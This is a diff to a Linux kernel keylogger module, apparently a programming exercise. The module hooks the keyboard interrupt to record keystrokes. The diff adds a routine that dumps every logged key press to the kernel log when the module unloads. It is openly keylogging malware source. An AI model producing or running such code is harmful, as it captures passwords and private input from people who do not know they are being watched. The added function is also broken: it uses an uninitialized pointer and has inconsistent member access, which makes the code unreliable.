@@ -91,7 +91,6 @@ static void		key_log_clean(void)
 	struct key_log_index	*lst;
 	struct key_log_index	*next;
 
-	mutex_lock(&key_log_lock);
 	lst = key_full_log;
 	while (lst) {
 		next = lst->next;
@@ -99,7 +98,6 @@ static void		key_log_clean(void)
 		kfree(lst);
 		lst = next;
 	}
-	mutex_unlock(&key_log_lock);
 }
 
 static struct key_map key_table[] = {
@@ -173,6 +171,8 @@ static struct key_map key_table[] = {
 	(struct key_map){0x0, 93, "Menu", "Menu", false, 0},
 	(struct key_map){0x0, 0, NULL, NULL, false, 0}
 };
+
+#define SCANCODE_ENTER 28
 
 static bool		key_ignore_caps(const struct key_map *key) {
 	if (key->scancode >= 2 && key->scancode <= 13)
@@ -325,12 +325,37 @@ static struct miscdevice		dev = {
 	&ops
 };
 
+static void		key_log_print_unified(void)
+{
+	ssize_t			i;
+	struct key_log_index	*lst;
+	struct key_log_entry	*log;
+
+	// seek to the end
+	while (lst->next)
+		lst = lst->next;
+	for (lst = key_full_log; lst; lst = lst->prev) {
+		for (i = 0; i < lst->used; i++) {
+			log = &lst->entries[i];
+			if (log->event != PRESS)
+				continue ;
+			if (log->key.scancode == SCANCODE_ENTER)
+				pr_info("\n");
+			else
+				pr_info("%s", (log->upper_case) ? log->key->upper_name : log->name);
+		}
+	}
+}
+
 static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
+	mutex_lock(&key_log_lock);
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
+	key_log_print_unified();
 	key_log_clean();
+	mutex_unlock(&key_log_lock);
 }
 
 static int		__init hello_init(void)
